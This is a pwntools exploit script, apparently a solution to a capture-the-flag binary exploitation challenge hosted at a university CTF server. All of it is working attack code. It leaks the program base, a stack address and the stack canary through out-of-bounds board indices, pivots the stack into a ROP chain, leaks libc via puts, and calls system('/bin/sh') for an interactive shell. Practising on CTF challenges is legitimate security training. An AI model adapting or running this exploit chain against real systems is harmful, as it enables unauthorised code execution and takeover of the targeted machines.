#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
r = remote('localhost', 4000)
#r = remote('ctf.ccns.ncku.edu.tw', 32771)
libc = ELF('./libc.so.6')

def write_board(s):
  r.sendlineafter('$ ', '1')
  r.send(s)

def view_board(idx):
  r.sendlineafter('$ ', '2')
  r.sendlineafter('Which index? ', str(idx))

def logout():
  r.sendlineafter('$ ', '3')

# leak text_base
view_board(4)
r.recvuntil('written: ')
text_base = u64(r.recv(6)+'\x00\x00') - 0xcd0
log.info('text base: ' + hex(text_base))

# leak stack address
view_board(-7)
r.recvuntil('written: ')
buf = u64(r.recv(6)+'\x00\x00') - 0x140
log.info('buf: ' + hex(buf))


pop_rdi = text_base + 0xd33
pop_rsi_r15 = text_base + 0xd31
pop_3 = text_base + 0xd2e
leave = text_base + 0xb80
view_code = text_base + 0xb82
view_code_in = text_base + 0xb86
write_code = text_base + 0xb38
write_code_in = text_base + 0xb3c
text_buf = text_base + 0x203000 - 0x100
puts_got = text_base + 0x202018
main_in = text_base + 0xbe5



# spilt into segments to avoid overwrite
payload1 = [buf-0x530, pop_rsi_r15]
payload2 = [0, 0xDEADBEEF]
payload3 = [pop_3, 0xDEADBEEF] # pop 'A's
payload4 = [write_code_in, text_buf, main_in] # already have leave_ret, buf-rdi = 0x530
payload5 = [buf+0x48, pop_rdi, puts_got, pop_rsi_r15, 0, 0, view_code_in] # leave to main_in in payload4


write_board(''.join(map(p64,payload1)))
write_board(''.join(map(p64,payload2)))
write_board(''.join(map(p64,payload3)))
write_board('A'*0x28+'@')

# leak canary
view_board(3)
r.recvuntil('@')
canary = u64('\x00'+r.recv(7))
log.info('canary: ' + hex(canary))

# leave to ROP
write_board(''.join(map(p64,payload4)) + p64(canary) + p64(buf) + p64(leave))


logout()

# leak libc_base
r.send(''.join(map(p64, payload5)))
r.recvuntil('written: ')
libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['puts']
log.info('libc base: ' + hex(libc_base))

system = libc_base + libc.symbols['system']
sh = libc_base + next(libc.search('/bin/sh'))

final_payload = [canary, 0xDEADBEEF, pop_rdi, sh, system]
write_board('AAAA')
write_board('AAAA')
write_board('AAAA')
write_board('AAAA')
write_board(''.join(map(p64,[pop_rdi, sh, system, canary, text_buf-0x28, leave])))

logout()

r.interactive('sh# ')
